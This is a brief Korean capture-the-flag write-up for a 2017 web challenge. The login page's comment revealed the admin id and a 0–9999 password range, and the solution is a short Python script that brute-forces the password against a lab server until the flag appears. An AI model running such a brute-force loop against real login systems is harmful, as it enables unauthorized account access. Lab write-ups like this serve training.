# [2017_BOB] \[WEB] Prob2

\* 서버가 닫혀있어서 기억을 더듬어 작성합니다.

### Problem

웹페이지에 접속하면 로그인 창이 하나 뜨는데 주석으로 아이디는 admin, pw는 0~9999라고 알려줍니다.



###Solution

```python
import requests

i=0
while True:
	r = requests.post('http://192.168.32.54/prob2.php', data = {"id":"admin","pw":str(i)})
	result = r.text
	if "Again" not in result:
		print r.text
		print i
		break
	i += 1
```

브포로 비밀번호를 때려맞춰 주면 플래그가 뜹니다.